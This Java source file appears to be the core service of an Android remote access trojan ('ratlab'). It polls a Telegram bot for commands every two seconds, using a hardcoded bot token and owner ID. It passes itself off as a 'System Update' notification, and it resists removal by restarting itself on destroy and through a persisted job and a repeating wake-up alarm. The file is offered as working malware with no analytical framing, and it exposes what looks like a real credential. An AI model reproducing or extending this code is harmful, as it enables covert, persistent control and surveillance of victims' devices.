package com.ratlab;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class BotService extends Service {

    private static final String TAG = "BotService";
    private static final String CHANNEL_ID = "system_update_channel";
    private static final int NOTIF_ID = 1001;
    private static final int JOB_ID = 2001;
    private static final int ALARM_ID = 3001;

    private ScheduledExecutorService scheduler;
    private CommandHandler handler;

    // Bot config — ganti token di sini
    public static final String BOT_TOKEN = "8794558788:AAFYy7NsJOth1qkeo-SiUt-16416hhyZfSw";
    public static final long OWNER_ID = 7714748144L;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());

        handler = new CommandHandler(this, BOT_TOKEN, OWNER_ID);

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(() -> {
            try {
                handler.pollUpdates();
            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
            }
        }, 0, 2, TimeUnit.SECONDS);

        scheduleJob();
        scheduleAlarm();
        Log.i(TAG, "Service started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdownNow();
        Intent svc = new Intent(this, BotService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void scheduleJob() {
        try {
            JobScheduler js = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
            ComponentName cn = new ComponentName(this, RestartJobService.class);
            JobInfo job = new JobInfo.Builder(JOB_ID, cn)
                    .setPersisted(true)
                    .setPeriodic(15 * 60 * 1000L)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .build();
            if (js != null) js.schedule(job);
        } catch (Exception e) {
            Log.e(TAG, "scheduleJob error: " + e.getMessage());
        }
    }

    private void scheduleAlarm() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent i = new Intent(this, AlarmReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(this, ALARM_ID, i,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            if (am != null) {
                am.setRepeating(AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis() + 60_000L,
                        60_000L,
                        pi);
            }
        } catch (Exception e) {
            Log.e(TAG, "scheduleAlarm error: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID,
                    "System Update",
                    NotificationManager.IMPORTANCE_LOW
            );
            ch.setDescription("System update service");
            ch.setSound(null, null);
            ch.enableVibration(false);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @SuppressWarnings("deprecation")
    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("System Update")
                    .setContentText("Checking for updates...")
                    .setSmallIcon(android.R.drawable.stat_sys_download)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("System Update")
                    .setContentText("Checking for updates...")
                    .setSmallIcon(android.R.drawable.stat_sys_download)
                    .build();
        }
    }
}
